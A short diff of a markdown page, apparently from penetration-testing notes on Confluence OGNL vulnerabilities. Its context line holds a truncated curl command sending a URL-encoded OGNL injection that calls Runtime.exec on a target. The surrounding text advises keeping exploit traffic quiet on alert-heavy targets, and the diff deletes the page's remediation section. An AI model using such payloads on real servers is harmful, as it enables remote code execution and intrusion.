@@ -47,11 +47,6 @@ curl -s "http://$TARGET/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22
     Confluence OGNL CVEs are ransomware favourites; targets are often alert-heavy.
     Confirm the version first and keep PoC traffic minimal.
 
-## :material-shield-check: Remediation
-
-- Patch immediately (Atlassian CVEs are frequent + wormed); restrict admin;
-  scrub secrets from tickets/pages; front with a WAF.
-
 ## :material-link-variant: Related
 
 - Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
